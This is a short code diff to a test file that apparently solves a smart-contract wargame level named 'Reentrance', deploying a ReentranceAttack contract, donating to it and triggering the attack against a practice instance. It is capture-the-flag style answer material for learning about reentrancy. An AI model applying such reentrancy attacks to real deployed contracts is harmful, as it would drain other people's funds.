@@ -18,7 +18,10 @@ describe("Reentrance", async function () {
     });
 
     it("Exploit", async function () {
-
+        // Basic reentrancy attack
+        const attacker = await (await ethers.getContractFactory("ReentranceAttack")).deploy(instance.address);
+        await instance.connect(player).donate(attacker.address, { value: ethers.utils.parseEther("0.001") });
+        await attacker.attack();
     });
 
     after(async function () {
